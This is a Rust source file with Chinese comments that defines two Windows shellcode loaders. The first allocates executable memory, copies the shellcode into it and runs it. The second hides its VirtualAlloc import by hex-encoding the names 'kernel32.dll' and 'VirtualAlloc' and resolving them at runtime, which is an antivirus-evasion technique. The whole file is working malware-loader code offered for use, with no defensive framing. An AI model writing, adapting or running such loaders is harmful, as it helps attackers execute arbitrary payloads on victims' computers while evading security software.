
use winapi::um::{
    winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE},
    memoryapi::{VirtualProtect},
    libloaderapi::{GetModuleHandleA, GetProcAddress}
};
use hex;
use std::{
    ffi::CString,
    mem
};



pub fn BasicShellcodeLoder(shellcode : &[u8]) { 

    // 调用VirtualAlloc函数分配可执行内存
    let exec = unsafe { winapi::um::memoryapi::VirtualAlloc(0 as _, shellcode.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    // 把shellcode拷贝到分配的内存中
    unsafe {
        let ptr = exec as *mut u8;
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());
    }
    // 把可执行内存的属性设置为可执行
    let mut old_protect: u32 = 0;
    let result = unsafe {
        winapi::um::memoryapi::VirtualProtect(
            exec as _,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    if result == 0 {
        panic!("VirtualProtect failed with error code {}", std::io::Error::last_os_error());
    }
    // 把内存中的shellcode当做函数执行
    let f: fn() -> () = unsafe { mem::transmute(exec) };
    f();

}


type VirtualAllocFn = unsafe extern "system" fn(
    lpAddress: *mut winapi::ctypes::c_void,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> *mut winapi::ctypes::c_void;

pub fn HideImportTableLoder(shellcode : &[u8]) {
    let Kname = hex::decode("6b65726e656c33322e646c6c").expect("");
    let Vname = hex::decode("5669727475616c416c6c6f63").expect("");

    let kernel32 = CString::new(Kname).expect("CString::new failed");
    let virtual_alloc = CString::new(Vname).expect("CString::new failed");
    let h_module = unsafe { GetModuleHandleA(kernel32.as_ptr() ) };

    let fn_virtual_alloc = unsafe {
        mem::transmute::<*const (), VirtualAllocFn>(
            GetProcAddress(
                h_module, 
                virtual_alloc.as_ptr()
            ) as *const ())
    };
    let Pexec = unsafe { fn_virtual_alloc(0 as _, shellcode.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    unsafe {
        let ptr = Pexec as *mut u8;
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());
    }

    let f: fn() -> () = unsafe { mem::transmute(Pexec) };
    f();
}